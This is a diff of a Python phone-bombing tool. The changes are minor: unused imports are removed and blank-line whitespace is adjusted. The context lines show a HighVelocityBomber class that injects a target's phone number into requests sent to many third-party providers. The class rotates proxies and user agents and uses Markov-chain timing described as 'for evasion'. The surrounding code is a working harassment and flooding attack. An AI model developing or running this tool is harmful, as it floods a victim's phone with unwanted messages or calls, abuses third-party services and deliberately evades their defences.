@@ -5,12 +5,9 @@ import time
 import logging
 import aiohttp
 import os
-import sys
-from aiohttp_socks import ProxyConnector
 from proxy_manager import ProxyManager
 
 logger = logging.getLogger(__name__)
-
 
 class MarkovRequestPattern:
     """Markov chain-based request timing for evasion"""
@@ -35,7 +32,6 @@ class MarkovRequestPattern:
             return random.uniform(0, base_delay * 0.2)  # Faster during burst
         else:  # Cooldown
             return random.uniform(base_delay * 1.5, base_delay * 3)
-
 
 class HighVelocityBomber:
     def __init__(self, phone, bomb_type, intensity, chat_id, proxy_manager=None):
@@ -101,7 +97,7 @@ class HighVelocityBomber:
         try:
             base_path = os.path.dirname(os.path.abspath(__file__))
             providers_path = os.path.join(base_path, 'providers.json')
-
+            
             with open(providers_path, 'r') as f:
                 data = json.load(f)
                 self.providers = data[self.bomb_type]
@@ -123,7 +119,7 @@ class HighVelocityBomber:
         """Inject phone number into request parameters"""
         if not provider:
             return None
-
+            
         config = provider.copy()
         for key in ['url', 'data', 'json', 'params']:
             if key in config:
@@ -139,11 +135,11 @@ class HighVelocityBomber:
         """Execute a single bombing request"""
         if not provider:
             return False
-
+            
         config = self.format_request(provider)
         if not config:
             return False
-
+            
         method = config.get('method', 'post').lower()
 
         # Use random user agent
@@ -187,7 +183,7 @@ class HighVelocityBomber:
         if not self.providers:
             logger.error("No providers loaded, cannot start attack")
             return
-
+            
         start_time = time.time()
 
         # Use proxy manager for rotation
@@ -233,7 +229,7 @@ class HighVelocityBomber:
         provider = self.get_next_provider()
         if not provider:
             return
-
+            
         delay = self.pattern.next_delay(self.delay)
         await asyncio.sleep(delay)
 
